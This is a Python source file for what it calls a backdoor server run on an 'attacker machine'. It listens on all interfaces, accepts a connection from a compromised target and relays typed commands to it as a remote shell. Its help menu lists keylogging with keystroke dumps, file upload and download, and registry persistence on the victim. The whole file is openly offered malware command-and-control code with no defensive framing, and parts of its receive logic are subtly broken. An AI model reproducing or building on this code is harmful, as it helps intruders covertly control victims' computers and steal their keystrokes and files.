# -*- Coding : utf-8 -*-

"""
    Backdoor server  to execute on attacker machine.
    Accept connection from target machine.
"""
import os
import socket
import termcolor


def help():
    help = """
        quit                : Quit session with the target
        clear               : Clear the screen
        cd <directory>      : Changes directory on target machine
        upload <filename>   : Upload file to target machine
        download <filename> : Doanload file to target machine
        keylog start        : Start keylogger
        keylog dump         : Print keystokes that target inputted
        keylog stop         : Stop and self destruct keylogger file
        persistance         : Create persistance in Registry
    """
    return help



def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode()
        except Exception as e:
            print(e)

        return data


def target_connection():
    while True:
        command = input(f"Shell@({termcolor.colored(ip[0],'cyan')}):~$ ")
        target.send(command.encode())

        if command == "quit":
            break
        elif command == "help":
            print(help())
        elif command == "clear":
            os.system("clear")

        else:
            response = reliable_recv()
            print(response)

    sock.close()

host = "0.0.0.0" # To accept connection from all interfaces
port = 65319

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))

print("[+] Listening for incoming connections..")
sock.listen(5)
target, ip = sock.accept()

print(f"[+] Target connected from {ip}")
target_connection()


